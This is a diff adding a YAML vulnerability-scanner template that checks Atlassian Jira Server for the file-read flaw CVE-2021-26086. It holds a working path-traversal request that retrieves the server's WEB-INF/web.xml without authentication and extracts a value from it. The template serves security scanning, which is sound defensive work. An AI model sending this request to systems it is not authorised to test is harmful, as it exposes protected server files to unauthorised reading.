@@ -1,0 +1,35 @@
+id: atlassian-jira-file-read-cve-2021-26086
+info:
+  name: Atlassian Jira Server File Read
+  author: ProjectDiscoveryAI
+  severity: medium
+  description: |
+    Atlassian Jira Server has a file reading vulnerability (CVE-2021-26086). Attackers can use this vulnerability to read files without authorization, causing partial file information leakage on the server.
+  reference:
+    - https://jira.atlassian.com/browse/JRASERVER-72695
+    - https://www.atlassian.com/software/jira/download-journey
+  classification:
+    cve-id: CVE-2021-26086
+    cvss-metrics: 3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:L/I:N/A:N
+    cvss-score: 5.3
+    cwe-id: CWE-22
+http:
+  - raw:
+      - |
+        GET /s/a/_/;/WEB-INF/web.xml HTTP/1.1
+        Host: {{Hostname}}
+
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+      - type: word
+        words:
+          - "<display-name>"
+        part: body
+    extractors:
+      - type: regex
+        part: body
+        regex:
+          - "<display-name>(.*?)</display-name>"
